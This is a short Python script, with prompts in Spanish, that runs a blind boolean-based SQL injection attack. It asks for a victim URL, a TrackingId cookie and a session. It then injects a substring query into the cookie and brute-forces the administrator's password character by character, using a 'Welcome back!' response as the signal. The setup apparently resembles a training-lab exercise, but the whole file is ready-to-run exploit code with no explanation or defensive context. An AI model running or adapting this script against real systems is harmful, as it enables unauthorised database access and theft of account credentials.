import requests, time, string, signal
from pwn import *

def KeyboardInterrupt(sig, frame):
    print ("Cerrando...")
    sys.exit(1)

signal.signal(signal.SIGINT, KeyboardInterrupt)


def fuerza_bruta():
    url = input("Ingrese la Url victima: ")
    tracker = input("Ingrese el TrackingID: ")
    session = input("Ingrese la sesion: ")
    vic = log.progress("Victima")
    vic.status(url)
    letterlib = string.printable
    contraseña = ("")
    prog = log.progress("Fuerza bruta")
    prog.status("Iniciando el ataque... ")
    prog2 = log.progress("Contraseña")
    time.sleep(2)
    for p in range(1,21):
        for s in letterlib:
            cookie = { 
                "TrackingId":f"{tracker}' and (select substring(password,{p},1) from users where username='administrator')='{s}", 
                "session":f"{session}"
            }
            
            prog.status(cookie["TrackingId"])
            r = requests.get(url, cookies=cookie)
            

            if "Welcome back!" in r.text:
                contraseña += (s)
                prog2.status(contraseña)
                break
fuerza_bruta()



    



